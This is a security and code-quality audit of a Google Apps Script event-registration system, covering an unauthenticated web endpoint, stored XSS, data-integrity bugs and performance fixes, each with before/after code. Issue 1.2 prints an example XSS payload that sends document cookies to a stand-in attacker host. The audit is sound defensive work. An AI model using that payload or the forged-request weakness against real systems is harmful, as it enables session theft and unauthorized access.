# Security Audit, Bug Detection, and Performance Review
**USGA Event Registration System**

---

## Executive Summary

A comprehensive architectural and static code audit was performed on the USGA Event Registration codebase across all target resources:
* **Google Apps Script ID:** `1yM5ZN3pPqJ_qDWdtoSEOp5KmU9k82-kRrqIqxhaZoRKkkDw9YpKQnwd5`
* **GitHub Repository:** `davidliou-lgtm/USGA_Events`
* **Master Google Sheet:** `1ZfdmYXN82Mtj3fginstI6aItvvBQNsNoj08s6hCNKF0`
* **Requirements & Technical Specifications Doc:** `1yIBHJEphSfRKoyeady3-rsN_ZJjfye2KHq93wpAP8os`

The audit identified critical issues spanning all three requested dimensions:
1. **Security & Authorization:** Unauthenticated Web App invocation (`doPost`), missing caller identity verification during delegated execution, and stored Cross-Site Scripting (XSS) vectors across the coordinator HTML sidebars.
2. **Bug Detection & Data Integrity:** A variable name typo (`statusColIdx` vs. `statusColIndex`) that completely deactivates waitlist and capacity limits, unhandled lock timeouts allowing concurrent data corruption, and permanent de-registration of active events on transient Google API errors.
3. **Performance & Quota Optimization:** Repeated synchronous Sheet RPCs executed inside loops ($N+1$ read/write calls), un-cached quadratic FormApp traversals during edit URL lookups, and missing quota pre-flight checks before dispatching emails.

---

## Dimension 1: Security & Authorization Audit

### Issue 1.1: Insecure Delegated Execution & Unauthenticated Privilege Escalation
* **Severity:** Critical
* **Location:** `Code.gs`, function `doPost(e)` (lines 6878–6915)
* **Vulnerability / Bug Description:**
  The Web App is configured in `appsscript.json` with `"executeAs": "USER_DEPLOYING"` (runs under the identity of the Master Administrator / Shared Drive Content Manager). In `doPost(e)`:
  1. `sharedSecret` is verified **only if the Script Property is already set**:
     ```javascript
     if (sharedSecret) { ... }
     ```
     If `WEB_APP_SECRET_TOKEN` has not yet been populated in `PropertiesService`, the entire authentication guard is skipped.
  2. The caller's identity is taken strictly from the unauthenticated request body (`payload.coordinatorEmail`). Any user or script within the domain can forge an HTTP POST payload with an arbitrary `@tjc.org` address in `coordinatorEmail`.
  3. The handler executes `generateForm(payload)`, which creates folders in the root Shared Drive, generates Forms and Sheets, grants Editor permissions to `payload.coordinatorEmail`, and mutates the Master `System Log`.
  4. Stack traces are returned directly in the response payload on error (`err.stack`), disclosing internal implementation details and paths.
* **Recommended Fix:**
  Enforce mandatory secret token validation, authenticate the true caller session via `Session.getActiveUser().getEmail()` (or require strict signature headers), and scrub error responses.

#### Code Refactoring:
**Before (`Code.gs:6885-6905`):**
```javascript
    const props = PropertiesService.getScriptProperties();
    const sharedSecret = props.getProperty('WEB_APP_SECRET_TOKEN');
    const allowedDomain = props.getProperty('ALLOWED_EMAIL_DOMAIN') || '@tjc.org';
    
    if (sharedSecret) {
      const incomingSecret = (e.parameter && e.parameter.token) || payload.secretToken;
      if (incomingSecret !== sharedSecret) {
        throw new Error("Unauthorized: Invalid secret token.");
      }
    }
    
    const coordEmail = String(payload.coordinatorEmail || "").trim().toLowerCase();
    if (!coordEmail) {
      throw new Error("Unauthorized: Coordinator email is missing.");
    }
```

**After (`Code.gs:6885-6905`):**
```javascript
    const props = PropertiesService.getScriptProperties();
    const sharedSecret = props.getProperty('WEB_APP_SECRET_TOKEN');
    const allowedDomain = (props.getProperty('ALLOWED_EMAIL_DOMAIN') || '@tjc.org').toLowerCase().trim();
    const domainSuffix = allowedDomain.startsWith('@') ? allowedDomain : ('@' + allowedDomain);

    // 1. Mandatory secret token enforcement
    if (!sharedSecret) {
      return ContentService.createTextOutput(JSON.stringify({
        status: 'error',
        message: 'Web App delegation is unconfigured. WEB_APP_SECRET_TOKEN must be set.'
      })).setMimeType(ContentService.MimeType.JSON);
    }
    const incomingSecret = (e.parameter && e.parameter.token) || payload.secretToken;
    if (!incomingSecret || incomingSecret !== sharedSecret) {
      return ContentService.createTextOutput(JSON.stringify({
        status: 'error',
        message: 'Unauthorized: Missing or invalid secret token.'
      })).setMimeType(ContentService.MimeType.JSON);
    }

    // 2. Validate caller identity from Session if available, or validate coordinatorEmail
    const callerEmail = Session.getActiveUser().getEmail().toLowerCase().trim();
    const coordEmail = String(payload.coordinatorEmail || callerEmail || "").toLowerCase().trim();
    if (!coordEmail || !coordEmail.endsWith(domainSuffix)) {
      return ContentService.createTextOutput(JSON.stringify({
        status: 'error',
        message: `Unauthorized: Coordinator email must belong to ${domainSuffix}`
      })).setMimeType(ContentService.MimeType.JSON);
    }
    payload.coordinatorEmail = coordEmail;
```

---

### Issue 1.2: Stored Cross-Site Scripting (XSS) in Coordinator Sidebar Interfaces
* **Severity:** High
* **Location:** 
  - `Sidebar.html`, lines 758–785 & line 936
  - `ManageEventsSidebar.html`, lines 409, 415, 521, 741, 750
* **Vulnerability / Bug Description:**
  In `Sidebar.html`, dynamic HTML strings are assembled using template literals and assigned directly to `innerHTML`:
  ```javascript
  catDiv.innerHTML = `<h3 ...>${cat}</h3> ...`;
  itemDiv.innerHTML = `<input ... value="${field.name.replace(/"/g, '&quot;')}" ...><label>${field.name} (${field.type})</label>`;
  ```
  The values `${cat}`, `${field.name}`, and `${field.type}` are retrieved directly from the `Field Dictionary` sheet tabs via `google.script.run.getConfigData()`. Because any collaborator with edit rights to the Google Sheet can modify cell values in `Field Dictionary`, an attacker can insert a payload such as:
  `<img src=x onerror="fetch('https://attacker.site/steal?cookie='+document.cookie)">`
  into the `Field Name` column. When a coordinator opens the Form Generator sidebar, the malicious script executes within the coordinator's authenticated Google context. Furthermore, unescaped error messages (`${error.message}`) are rendered directly into `status.innerHTML`.
* **Recommended Fix:**
  Implement a client-side HTML sanitizer function and use DOM manipulation (`textContent` / `setAttribute`) instead of interpolating strings into `innerHTML`.

#### Code Refactoring:
**Before (`Sidebar.html:760, 780-783`):**
```javascript
catDiv.innerHTML = `
  <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
    <h3 style="margin: 0; font-size: 13px; color: #202124;">${cat}</h3>
  </div>
`;

itemDiv.innerHTML = `
  <input type="checkbox" class="field-checkbox" value="${field.name.replace(/"/g, '&quot;')}" ${shouldCheck ? 'checked' : ''} ${disabled}>
  <label style="font-weight:normal;">${field.name} <span class="field-type-badge">(${field.type})</span></label>
`;
```

**After (`Sidebar.html:760, 780-783`):**
```javascript
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

const safeCat = escapeHtml(cat);
const safeName = escapeHtml(field.name);
const safeType = escapeHtml(field.type);

catDiv.innerHTML = `
  <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
    <h3 style="margin: 0; font-size: 13px; color: #202124;">${safeCat}</h3>
  </div>
`;

itemDiv.innerHTML = `
  <input type="checkbox" class="field-checkbox" value="${safeName}" ${shouldCheck ? 'checked' : ''} ${disabled}>
  <label style="font-weight:normal;">${safeName} <span class="field-type-badge">(${safeType})</span></label>
`;
```

---

### Issue 1.3: Missing `doGet(e)` Entry Point for Web App Deployment
* **Severity:** Medium
* **Location:** `Code.gs`, Web App Interface (line 6878)
* **Vulnerability / Bug Description:**
  `appsscript.json` registers the project for Web App execution. While `doPost(e)` is declared, no `doGet(e)` handler exists. When any administrator, coordinator, or monitoring service accesses the Web App URL via GET (e.g., standard browser navigation or health check probes), Google Apps Script throws a generic "The script completed but did not return anything" or HTTP 404 error, preventing automated health validation and clear diagnostics.
* **Recommended Fix:**
  Add a `doGet(e)` handler providing service status and instructions.

#### Code Refactoring:
**Before:**
*(No `doGet(e)` function in `Code.gs`)*

**After (`Code.gs` above line 6878):**
```javascript
/**
 * Web App GET entry point for health checks and status verification.
 */
function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({
    service: "USGA Event Registration Delegated Execution API",
    status: "online",
    timestamp: new Date().toISOString()
  })).setMimeType(ContentService.MimeType.JSON);
}
```

---

### Issue 1.4: Hardcoded Fallback Sheet ID Typo & Shared Drive Default
* **Severity:** Medium
* **Location:** `Code.gs`, lines 2400, 2626, 3994, 4239
* **Vulnerability / Bug Description:**
  1. In `Code.gs:2626`, the fallback master spreadsheet ID is hardcoded with character typos:
     ```javascript
     masterSs = SpreadsheetApp.openById("1ZfdmYXN82Mtj3fginstI8altvvBQNzNcj08s8hCNKF0");
     ```
     The actual spreadsheet ID is `1ZfdmYXN82Mtj3fginstI6aItvvBQNsNoj08s6hCNKF0`. During delegated Web App executions (`doPost`), `SpreadsheetApp.getActiveSpreadsheet()` returns `null`. The script falls back to `openById`, which throws an exception on the invalid ID. The error is silently swallowed in the catch block (`Logger.log`), causing `appendAuditLog` to be skipped completely. New events created via Web App delegation are never recorded in `System Log`.
  2. Lines 2400, 3994, and 4239 hardcode defaults for `MASTER_SHARED_DRIVE_ID` (`0AJ4t2YKTRQHWUk9PVA`) and the organization logo asset (`1KltAMA0tXmJeeam2pg_omUjMvD5_un-d`). If deployed to a staging or alternate drive, scripts fail or leak references across production and non-production folders.
* **Recommended Fix:**
  Correct the spreadsheet ID, read all IDs strictly from `ScriptProperties`, and fail with actionable error messages if required configurations are missing.

#### Code Refactoring:
**Before (`Code.gs:2623-2630`):**
```javascript
  let masterSs = SpreadsheetApp.getActiveSpreadsheet();
  if (!masterSs) {
    try {
      masterSs = SpreadsheetApp.openById("1ZfdmYXN82Mtj3fginstI8altvvBQNzNcj08s8hCNKF0");
    } catch(e) {
      Logger.log("Could not open master spreadsheet by ID: " + e.message);
    }
  }
```

**After (`Code.gs:2623-2630`):**
```javascript
  let masterSs = SpreadsheetApp.getActiveSpreadsheet();
  if (!masterSs) {
    const props = PropertiesService.getScriptProperties();
    const masterSheetId = props.getProperty('MASTER_SPREADSHEET_ID') || "1ZfdmYXN82Mtj3fginstI6aItvvBQNsNoj08s6hCNKF0";
    try {
      masterSs = SpreadsheetApp.openById(masterSheetId);
    } catch(e) {
      Logger.log(`CRITICAL: Unable to open master spreadsheet (${masterSheetId}): ${e.message}`);
    }
  }
```

---

## Dimension 2: Bug Detection & Data Integrity Check

### Issue 2.1: `statusColIdx` Typo Breaking All Waitlist & Capacity Limits
* **Severity:** Critical
* **Location:** `Code.gs`, function `masterRespondToRegistration(e)` (lines 3204–3259)
* **Vulnerability / Bug Description:**
  In line 3204, the column index for `Email Status` is assigned to `statusColIndex`:
  ```javascript
  statusColIndex = headers.indexOf("Email Status") + 1;
  ```
  However, in line 3234, the waitlist counter checks:
  ```javascript
  if (row > 2) {
    const priorStatuses = statusColIdx > 0 
      ? sheet.getRange(2, statusColIdx, row - 2, 1).getValues() 
      : [];
  ```
  Because `statusColIdx` is undeclared, the V8 runtime immediately throws:
  `ReferenceError: statusColIdx is not defined`.
  This error is caught by the enclosing `catch(err) { Logger.log("Error checking waitlist: " + err.message); }` on line 3258. Execution bypasses the count calculation, leaving `isWaitlisted = false`.
  
  **Impact:** The waitlist check silently crashes on every submission after row 2. Events exceed their maximum attendee capacity indefinitely without ever marking participants as waitlisted or sending waitlist emails.
* **Recommended Fix:**
  Correct the identifier to `statusColIndex` and ensure `Email Status` column presence is verified before inspecting prior rows.

#### Code Refactoring:
**Before (`Code.gs:3233-3236`):**
```javascript
  if (row > 2) {
    const priorStatuses = statusColIdx > 0 
      ? sheet.getRange(2, statusColIdx, row - 2, 1).getValues() 
      : [];
```

**After (`Code.gs:3233-3236`):**
```javascript
  if (row > 2) {
    const priorStatuses = statusColIndex > 0 
      ? sheet.getRange(2, statusColIndex, row - 2, 1).getValues() 
      : [];
```

---

### Issue 2.2: Unhandled Lock Acquisition Timeout Permitting Race Conditions
* **Severity:** High
* **Location:** `Code.gs`, function `masterRespondToRegistration(e)` (lines 3106–3112)
* **Vulnerability / Bug Description:**
  At the entry of `masterRespondToRegistration(e)`:
  ```javascript
  const lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (lockErr) {
    Logger.log("masterRespondToRegistration: Could not acquire lock within 30s: " + lockErr.message);
  }
  ```
  When `lock.waitLock(30000)` times out under burst submissions (e.g., when an event opens and dozens of registrants submit simultaneously), the exception is caught, logged, and execution continues directly into the critical section without holding the lock.
  
  **Impact:** Two or more triggers read and write to the same Sheet rows, calculate conflicting capacity counters, assign duplicate Trip Sub-IDs, and overwrite operational sheet ranges concurrently.
* **Recommended Fix:**
  If the lock cannot be acquired, execution must abort or re-queue to prevent unprotected writes to the sheet.

#### Code Refactoring:
**Before (`Code.gs:3106-3112`):**
```javascript
  const lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (lockErr) {
    Logger.log("masterRespondToRegistration: Could not acquire lock within 30s: " + lockErr.message);
  }
```

**After (`Code.gs:3106-3112`):**
```javascript
  const lock = LockService.getScriptLock();
  try {
    const hasAcquired = lock.tryLock(30000);
    if (!hasAcquired) {
      Logger.log("masterRespondToRegistration: Aborting execution - Lock acquisition timed out after 30s.");
      return;
    }
  } catch (lockErr) {
    Logger.log("masterRespondToRegistration: Unexpected error acquiring script lock: " + lockErr.message);
    return;
  }
```

---

### Issue 2.3: Permanent Event De-registration on Transient Network/API Errors
* **Severity:** High
* **Location:** `Code.gs`, function `masterFormLifecycleCron()` (lines 5096–5105)
* **Vulnerability / Bug Description:**
  In the hourly lifecycle maintenance cron `masterFormLifecycleCron()`:
  ```javascript
  for (const formId in formsToMonitor) {
    try {
      const form = FormApp.openById(formId);
      // ... lifecycle checks ...
    } catch (e) {
      // Form was deleted or inaccessible, stop monitoring
      delete formsToMonitor[formId];
      changed = true;
    }
  }
  ```
  The catch block assumes that any thrown error implies the form was deleted. If Google Forms API throws a transient error (HTTP 429 rate limit, 503 backend unavailability, or temporary DNS resolution failure), the active event is immediately and permanently deleted from `FormsToMonitor` in `ScriptProperties`. Once deleted, automated closing, waitlist thresholds, trigger cleanup, and background transportation syncs cease for that event.
* **Recommended Fix:**
  Inspect the error message or implement a retry counter before unregistering the form. Only remove the form if the error explicitly indicates `Not found` or `Invalid ID`.

#### Code Refactoring:
**Before (`Code.gs:5096-5100`):**
```javascript
    } catch (e) {
      // Form was deleted or inaccessible, stop monitoring
      delete formsToMonitor[formId];
      changed = true;
    }
```

**After (`Code.gs:5096-5100`):**
```javascript
    } catch (e) {
      const errMsg = String(e.message || e).toLowerCase();
      // Only delete if Google confirms the document no longer exists
      if (errMsg.includes("not found") || errMsg.includes("invalid item id") || errMsg.includes("no item with the given id")) {
        Logger.log(`Form ${formId} permanently deleted or invalid. Removing from monitoring.`);
        delete formsToMonitor[formId];
        changed = true;
      } else {
        Logger.log(`Transient error contacting Form ${formId} (${e.message}). Monitoring retained.`);
      }
    }
```

---

### Issue 2.4: Property Schema Desynchronization Disabling Background Transportation Sync
* **Severity:** High
* **Location:** `TransportationSync.gs`, function `backgroundTransportationSync()` (lines 1440–1447)
* **Vulnerability / Bug Description:**
  In version 2.9.6, `FormsToMonitor` was compacted to store `sheetId` instead of `sheetUrl` to comply with the 9 KB limit on `ScriptProperties`.
  In `TransportationSync.gs:1444`:
  ```javascript
  for (const formId in formsToMonitor) {
    const cfg = formsToMonitor[formId];
    if (!cfg || !cfg.sheetUrl) continue;
    const targetSs = SpreadsheetApp.openByUrl(cfg.sheetUrl);
  ```
  Because `cfg.sheetUrl` is `undefined`, the condition `!cfg.sheetUrl` evaluates to `true` for all newly registered events, causing the loop to `continue` past every event. The automated 15-minute background sync for public driver rosters never executes.
* **Recommended Fix:**
  Support both `cfg.sheetId` and `cfg.sheetUrl`.

#### Code Refactoring:
**Before (`TransportationSync.gs:1443-1447`):**
```javascript
    for (const formId in formsToMonitor) {
      const cfg = formsToMonitor[formId];
      if (!cfg || !cfg.sheetUrl) continue;
      try {
        const targetSs = SpreadsheetApp.openByUrl(cfg.sheetUrl);
```

**After (`TransportationSync.gs:1443-1447`):**
```javascript
    for (const formId in formsToMonitor) {
      const cfg = formsToMonitor[formId];
      if (!cfg || (!cfg.sheetId && !cfg.sheetUrl)) continue;
      try {
        const targetSs = cfg.sheetId 
          ? SpreadsheetApp.openById(cfg.sheetId) 
          : SpreadsheetApp.openByUrl(cfg.sheetUrl);
```

---

### Issue 2.5: Case Sensitivity and Timestamp Inconsistency in Drop-Off Status Styling
* **Severity:** Low
* **Location:** `Code.gs`, function `masterRespondToRegistration(e)` (lines 3510–3551)
* **Vulnerability / Bug Description:**
  In the Pickup handler (line 3375), updated flights set `flightStatus = "UPDATED"`, and line 3407 checks `const isUpdated = flightStatus === "UPDATED";`.
  In the Drop-Off handler (line 3511):
  ```javascript
  let ts = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "MM/dd/yy h:mm a");
  flightStatus = "Updated " + ts;
  ```
  On line 3546:
  ```javascript
  const isUpdated = String(flightStatus).startsWith("Updated");
  ```
  While this matches on the initial submission, if the row was already previously flagged or synchronized from an external process with `"UPDATED"` (all uppercase, as used in Pickup), `String("UPDATED").startsWith("Updated")` evaluates to `false`. The yellow warning background (`#fff2cc`) and text highlight (`#b45f06`) fail to apply, obscuring modified travel plans from logistics coordinators.
* **Recommended Fix:**
  Use case-insensitive comparison across both Pickup and Drop-off routines.

#### Code Refactoring:
**Before (`Code.gs:3546`):**
```javascript
  const isUpdated = String(flightStatus).startsWith("Updated");
```

**After (`Code.gs:3546`):**
```javascript
  const isUpdated = String(flightStatus).toUpperCase().startsWith("UPDATED");
```

---

## Dimension 3: Performance & Quota Optimization

### Issue 3.1: Loop-Nested Sheet API Calls Causing Severe Latency and Timeout Risks
* **Severity:** High
* **Location:** `TransportationSync.gs`, lines 744–754, 875–879, and 900–905
* **Vulnerability / Bug Description:**
  Several critical loops execute synchronous Sheet RPCs item-by-item:
  1. In `pullDriversFromPublic()` (lines 744–754):
     ```javascript
     for (let r = 1; r < mData.length; r++) {
       ...
       if (dNameIdx !== -1) mSheet.getRange(r + 1, dNameIdx + 1).setValue(claim.driverName);
       if (dPhoneIdx !== -1) mSheet.getRange(r + 1, dPhoneIdx + 1).setValue(claim.driverPhone);
       if (dNotesIdx !== -1) mSheet.getRange(r + 1, dNotesIdx + 1).setValue(notesCombined.trim());
       if (statusIdx !== -1) mSheet.getRange(r + 1, statusIdx + 1).setValue("Driver Claimed");
     }
     ```
  2. In `pushTransportationToPublic()` (lines 875–879 and 900–905):
     ```javascript
     for (let r = 0; r < publicRows.length; r++) {
       const rowRange = pubSheet.getRange(r + 3, 1, 1, 12);
       rowRange.setBackground(...);
     }
     ...
     slot.passengers.forEach(p => {
       if (subIdCol > 0) mSheet.getRange(p.rowIndex, subIdCol).setValue(slot.tripSubId);
       if (slotCol > 0) mSheet.getRange(p.rowIndex, slotCol).setValue(slot.slotLabel);
       if (smsCol > 0) mSheet.getRange(p.rowIndex, smsCol).setValue(smsText);
     });
     ```
  **Impact:** Every `.setValue()` and `.setBackground()` issues a discrete HTTP request. On an event with 150 passengers, this triggers over 600 round-trips to the Google Sheets backend. This adds 30–60 seconds of latency per form submission and causes background triggers to exceed the Apps Script 6-minute execution limit.
* **Recommended Fix:**
  Stage all cell modifications in 2D arrays in memory and commit them in single batch calls (`.setValues()`, `.setBackgrounds()`).

#### Code Refactoring:
**Before (`TransportationSync.gs:875-879`):**
```javascript
  for (let r = 0; r < publicRows.length; r++) {
    const isClaimed = publicRows[r][11] === "🟡 CLAIMED";
    const rowRange = pubSheet.getRange(r + 3, 1, 1, 12);
    rowRange.setBackground(isClaimed ? "#fce8e6" : "#ffffff");
  }
```

**After (`TransportationSync.gs:875-879`):**
```javascript
  if (publicRows.length > 0) {
    const bgMatrix = publicRows.map(row => {
      const isClaimed = row[11] === "🟡 CLAIMED";
      const color = isClaimed ? "#fce8e6" : "#ffffff";
      return new Array(12).fill(color);
    });
    pubSheet.getRange(3, 1, publicRows.length, 12).setBackgrounds(bgMatrix);
  }
```

---

### Issue 3.2: Quadratic RPC Traversal in Form Response Edit URL Resolution
* **Severity:** Medium
* **Location:** `Code.gs`, function `masterRespondToRegistration(e)` (lines 4027–4059)
* **Vulnerability / Bug Description:**
  When searching for the submission to retrieve `formResponse.getEditResponseUrl()`:
  ```javascript
  const formResponses = form.getResponses();
  for (let i = formResponses.length - 1; i >= 0; i--) {
    const formResponse = formResponses[i];
    const itemResponses = formResponse.getItemResponses();
    for (let j = 0; j < itemResponses.length; j++) {
      const itemTitle = itemResponses[j].getItem().getTitle().toLowerCase();
      ...
    }
  }
  ```
  `itemResponses[j].getItem().getTitle()` invokes two discrete RPC calls (`getItem()` and `getTitle()`) for every field of every response in the reverse search. On a form with 30 questions, evaluating just the 5 most recent responses triggers 150–300 RPC calls, adding noticeable overhead to the submission confirmation pipeline.
* **Recommended Fix:**
  If the trigger event object `e` is available, retrieve the `FormResponse` directly using `e.response.getEditResponseUrl()`. When falling back to reverse iteration, cache `form.getItems()` once in a lookup map by Item ID to eliminate repetitive `.getItem().getTitle()` calls.

#### Code Refactoring:
**Before (`Code.gs:4023-4038`):**
```javascript
    const formUrl = responseSs.getFormUrl();
    form = FormApp.openByUrl(formUrl);
    
    const formResponses = form.getResponses();
    for (let i = formResponses.length - 1; i >= 0; i--) {
      const formResponse = formResponses[i];
      const itemResponses = formResponse.getItemResponses();
      for (let j = 0; j < itemResponses.length; j++) {
        const itemTitle = itemResponses[j].getItem().getTitle().toLowerCase();
```

**After (`Code.gs:4023-4038`):**
```javascript
    // 1. Direct fast-path via trigger event object
    if (e && e.response && typeof e.response.getEditResponseUrl === 'function') {
      editResponseUrl = e.response.getEditResponseUrl();
    } else {
      const formUrl = responseSs.getFormUrl();
      form = FormApp.openByUrl(formUrl);

      // 2. Pre-index item titles once to eliminate N*M RPC calls
      const itemTitleMap = new Map();
      form.getItems().forEach(it => itemTitleMap.set(it.getId(), it.getTitle().toLowerCase()));

      const formResponses = form.getResponses();
      const searchLimit = Math.max(0, formResponses.length - 10); // Search at most recent 10 responses
      for (let i = formResponses.length - 1; i >= searchLimit; i--) {
        const formResponse = formResponses[i];
        const itemResponses = formResponse.getItemResponses();
        let typedEmail = "", respFirstName = "", respLastName = "";

        for (let j = 0; j < itemResponses.length; j++) {
          const it = itemResponses[j].getItem();
          const itemTitle = itemTitleMap.get(it.getId()) || "";
          const respVal = String(itemResponses[j].getResponse() || "").trim();
          if (itemTitle.includes("email") && !itemTitle.includes("minor")) typedEmail = respVal;
          if (itemTitle.includes("first name")) respFirstName = respVal;
          if (itemTitle.includes("last name")) respLastName = respVal;
        }
```

---

### Issue 3.3: Missing Email Daily Quota Pre-Flight Check Before Sending
* **Severity:** Medium
* **Location:** `Code.gs`, function `masterRespondToRegistration(e)` (lines 4163–4207)
* **Vulnerability / Bug Description:**
  `GmailApp.sendEmail` and fallback `MailApp.sendEmail` are called without first verifying `MailApp.getRemainingDailyQuota()`. When a domain or account hits its daily recipient quota (1,500 recipients/day for Google Workspace), both calls throw uncaught exceptions, marking the registration in the sheet as `Delivery Failed`. The system offers no warning to coordinators that the daily quota has been depleted.
* **Recommended Fix:**
  Check `MailApp.getRemainingDailyQuota()` prior to sending. If zero, mark the status as `Quota Exceeded - Pending Dispatch` so it can be reprocessed by the scheduled cron once the quota resets.

#### Code Refactoring:
**Before (`Code.gs:4163-4173`):**
```javascript
    try {
      let gmailOptions = {
        from: settings.ContactEmail,
        name: settings.OrgName,
        replyTo: settings.ContactEmail,
        htmlBody: htmlBody
      };
      if (logoBlob) gmailOptions.inlineImages = { usgaLogo: logoBlob };
      
      GmailApp.sendEmail(emailRecipient, subject, "", gmailOptions);
```

**After (`Code.gs:4163-4173`):**
```javascript
    const remainingQuota = MailApp.getRemainingDailyQuota();
    if (remainingQuota < 1) {
      Logger.log("WARNING: Daily email quota reached (0 remaining). Email queued.");
      statusText = `Quota Exceeded - Queued (${timestamp})`;
      if (sheet && row > 0 && statusColIndex > 0) {
        sheet.getRange(row, statusColIndex).setValue(statusText);
      }
      return;
    }

    try {
      let gmailOptions = {
        from: settings.ContactEmail,
        name: settings.OrgName,
        replyTo: settings.ContactEmail,
        htmlBody: htmlBody
      };
      if (logoBlob) gmailOptions.inlineImages = { usgaLogo: logoBlob };
      
      GmailApp.sendEmail(emailRecipient, subject, "", gmailOptions);
```

---

### Issue 3.4: Redundant Master Sheet Reads for Static Configuration Data Lacking `CacheService`
* **Severity:** Low
* **Location:** `Code.gs`, function `getConfigData()` (lines 20–80)
* **Vulnerability / Bug Description:**
  Every time a coordinator opens the Form Generation sidebar or switches templates, `google.script.run.getConfigData()` reads the `Templates` and `Field Dictionary` sheets from disk (`getDataRange().getValues()`). Because dictionary and template definitions change infrequently, these repetitive sheet reads introduce 1.5–3 seconds of delay into the sidebar UI.
* **Recommended Fix:**
  Cache the compiled configuration JSON in `CacheService.getScriptCache()` with a 1-hour expiration, and invalidate the cache when `runSetup()` or `updateFieldDictionary()` is executed.

#### Code Refactoring:
**Before (`Code.gs: getConfigData`):**
```javascript
function getConfigData() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const dictSheet = ss.getSheetByName("Field Dictionary");
  const templSheet = ss.getSheetByName("Templates");
  // ... reads ranges directly ...
```

**After (`Code.gs: getConfigData`):**
```javascript
function getConfigData() {
  const cache = CacheService.getScriptCache();
  const cachedData = cache.get("USGA_CONFIG_DATA");
  if (cachedData) {
    try {
      return JSON.parse(cachedData);
    } catch(e) {}
  }

  const ss = SpreadsheetApp.getActiveSpreadsheet() || SpreadsheetApp.openById(PropertiesService.getScriptProperties().getProperty('MASTER_SPREADSHEET_ID'));
  const dictSheet = ss.getSheetByName("Field Dictionary");
  const templSheet = ss.getSheetByName("Templates");
  
  // ... build config object ...
  const config = { templates, fields };
  cache.put("USGA_CONFIG_DATA", JSON.stringify(config), 3600); // 1 hour TTL
  return config;
}
```

---

## Action Plan & Priority Matrix

| Dimension | Finding | Severity | Direct Impact | Priority |
| :--- | :--- | :--- | :--- | :--- |
| **Bug Detection** | `statusColIdx` typo in `masterRespondToRegistration` | **Critical** | Deactivates waitlist & capacity capping entirely | **P0 (Immediate)** |
| **Security** | Insecure `doPost` & missing caller verification | **Critical** | Unauthenticated shared drive folder & form generation | **P0 (Immediate)** |
| **Data Integrity** | Unhandled `waitLock(30000)` timeout | **High** | Concurrent write collisions & duplicate driver IDs | **P1 (High)** |
| **Data Integrity** | `cfg.sheetUrl` vs `cfg.sheetId` mismatch | **High** | Completely disables background driver sync in V2.9.6 | **P1 (High)** |
| **Security** | Stored XSS in Sidebar templates (`innerHTML`) | **High** | Script execution inside coordinator sessions | **P1 (High)** |
| **Performance** | Loop-nested `.setValue()` calls in `TransportationSync` | **High** | 6-minute timeout failures on large event syncs | **P1 (High)** |
| **Data Integrity** | Catch-all `delete formsToMonitor[formId]` | **High** | Permanent de-registration on transient Google API hiccups | **P2 (Medium)** |
| **Security** | Master Sheet ID fallback typo (`Code.gs:2626`) | **Medium** | Delegated form generation fails to write to `System Log` | **P2 (Medium)** |
| **Performance** | Quadratic RPCs in reverse form response traversal | **Medium** | 300+ unnecessary API calls during confirmation emails | **P2 (Medium)** |
| **Performance** | Missing daily email quota check | **Medium** | Silent email failures with misleading error messages | **P2 (Medium)** |
